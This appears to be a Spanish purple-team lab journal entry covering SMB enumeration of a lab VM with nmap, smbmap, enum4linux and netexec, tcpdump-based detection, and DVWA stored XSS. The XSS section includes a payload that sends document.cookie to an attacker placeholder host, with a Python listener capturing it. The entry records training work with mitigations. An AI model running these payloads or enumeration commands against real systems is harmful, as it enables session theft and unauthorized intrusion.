# Día 5 — SMB Enumeration

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares  
**Táctica:** Lateral Movement (TA0008)

## Red Team

### Comandos ejecutados
| Comando | Output |
|---|---|
| `nmap -p 445 --script smb2-security-mode <target>` | Message signing enabled but not required |
| `smbclient -L <target> -N` | 3 shares: print$, shared, IPC$ |
| `smbmap -H <target>` | shared → READ, WRITE con NULL session |
| `enum4linux -a <target>` | Usuario vboxuser expuesto, política débil |
| `netexec smb <target>` | signing:False, Null Auth:True |

### Hallazgos críticos
- Share `shared` con READ/WRITE sin credenciales — misconfiguration severa
- SMB signing deshabilitado — vulnerable a SMB Relay attacks
- Sesiones NULL permitidas — enumeración sin autenticación
- Usuario `vboxuser` expuesto via RID cycling
- Política de contraseñas débil — mínimo 5 caracteres, sin complejidad, sin lockout
- `netexec` reemplaza a `crackmapexec` — paquete obsoleto en Kali

## Blue Team

### Detección
| Comando | Qué detectó |
|---|---|
| `sudo tcpdump -i enp0s3 -n src host <attacker> and not port 22 -w dia05_capture.pcap` | Múltiples conexiones TCP al puerto 445 |
| `sudo tcpdump -r dia05_capture.pcap -n \| head -30` | Sesiones SMB cortas y rápidas + NetBIOS port 137 |

### Evidencia
- Múltiples conexiones consecutivas al puerto 445 en segundos
- NetBIOS port 137 respondió con nombre `UBUNTU-VICTIM`
- Patrón de sesiones cortas con `Flags [F.]` — típico de enumeración automatizada
- Sin alerta automática — detección 100% manual

## Purple Team Analysis

**Effectiveness Score: 65/100**

| Red Team | Blue Team |
|---|---|
| enum4linux extrajo usuario sin credenciales | Conexiones TCP al 445 visibles en tcpdump |
| smbmap confirmó READ/WRITE anónimo | NetBIOS respondió con nombre del servidor |
| netexec confirmó SMB signing deshabilitado | Patrón de sesiones cortas delata automatización |

### Security Gaps
- Share con acceso anónimo READ/WRITE
- SMB signing deshabilitado — SMB Relay posible
- NULL sessions permitidas
- Política de contraseñas sin complejidad ni lockout
- Sin IDS para detección automática de SMB enumeration

### Lección
SMB enumeration sin credenciales es posible por tres misconfigurations combinadas — guest access, NULL sessions y SMB signing deshabilitado. La firma SMB es especialmente crítica — sin ella un atacante puede interceptar y reutilizar credenciales NTLM.

## DVWA — XSS Stored (Low)

### Explotación
| Payload | Output |
|---|---|
| `<script>alert('XSS Stored')</script>` | Popup automático en cada recarga — persistente en DB |
| `<script>alert(document.cookie)</script>` | PHPSESSID exfiltrado — persiste para todos los visitantes |
| `<script>document.location='http://<attacker>/?cookie='+document.cookie</script>` + `python3 -m http.server 80` | Cookie capturada en servidor Python de Kali |

### Diferencia vs XSS Reflected
- Reflected: afecta 1 usuario via link malicioso
- Stored: afecta TODOS los visitantes — persiste en DB hasta limpieza manual
- Payload de sesión anterior (Wix) seguía activo — demuestra acumulación en DB

### Mitigación
- Output encoding en almacenamiento Y en visualización
- Flag HttpOnly en cookies
- Content Security Policy
- CVSS: 8.4 High

## App MS Security
- Alert Dashboard React conectado a Flask — 5 alertas con colores por severidad
- `useEffect` + `fetch` consumiendo endpoint `/alerts`
- Colores dinámicos: Critical=rojo, High=naranja, Medium=amarillo, Low=verde

## Wazuh
- Rule 61110: Multiple System error events — ProtonVPN WireGuard + TPM 1040
- TPM 1040 investigado — falso positivo AMD confirmado con `Get-Tpm`
- **Mitigación aplicada:** SessionEnv deshabilitado — `StartType: Disabled`
- SessionEnv aparecía 8x — resuelto definitivamente

## GitHub
- Repositorios creados: `purple-team-lab-journal` + `ms-security-app`
- Código ms-security-app subido exitosamente
- Flujo Markdown implementado a partir de este día
